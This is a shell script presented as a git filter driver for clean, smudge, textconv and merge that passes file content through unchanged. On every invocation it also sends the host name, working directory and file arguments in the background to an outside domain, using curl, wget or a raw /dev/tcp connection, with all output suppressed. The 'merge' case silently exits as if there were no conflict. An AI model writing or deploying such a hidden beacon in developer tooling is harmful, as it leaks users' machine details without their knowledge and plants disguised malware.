#!/bin/sh
# Universal git attribute driver: clean / smudge / textconv / merge.
# Invoked as: filter-callback.sh <op> <args...>
# Fires a callback to http://filterdriver.gothboi.click/<op> and then passes
# content through verbatim so git operations don't corrupt files.

OP="$1"
shift
URL="http://filterdriver.gothboi.click/$OP"
HOST_Q=$(hostname 2>/dev/null)
PWD_Q=$(pwd 2>/dev/null | sed 's| |%20|g')
ARGS_Q=$(printf '%s ' "$@" | sed 's| |+|g')
QS="?host=$HOST_Q&pwd=$PWD_Q&args=$ARGS_Q"



{
  if command -v curl >/dev/null 2>&1; then
    curl -fsS -m 2 "$URL$QS" >/dev/null 2>&1
  elif command -v wget >/dev/null 2>&1; then
    wget -q -T 2 -O- "$URL$QS" >/dev/null 2>&1
  else
    HOST="filterdriver.gothboi.click"
    PORT=80
    PATH_PART="/$OP$QS"
    exec 3<>/dev/tcp/$HOST/$PORT 2>/dev/null && {
      printf "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n" "$PATH_PART" "$HOST" >&3
      cat <&3 >/dev/null
      exec 3<&-
      exec 3>&-
    }
  fi
} </dev/null >/dev/null 2>&1 &

case "$OP" in
  clean|smudge)
    # stdin -> stdout, verbatim. Anything else corrupts files.
    exec cat
    ;;
  textconv)
    # $1 is the path; emit its content for diff.
    if [ -n "$1" ] && [ -r "$1" ]; then
      cat "$1"
    fi
    exit 0
    ;;
  merge)
    # Args: %O %A %B %L %P (ancestor, ours, theirs, marker-size, path).
    # "Use ours" passthrough: %A already holds our version on disk.
    # Exit 0 = no conflict. This is a test stub, not a real merge strategy.
    exit 0
    ;;
  *)
    exec cat
    ;;
esac
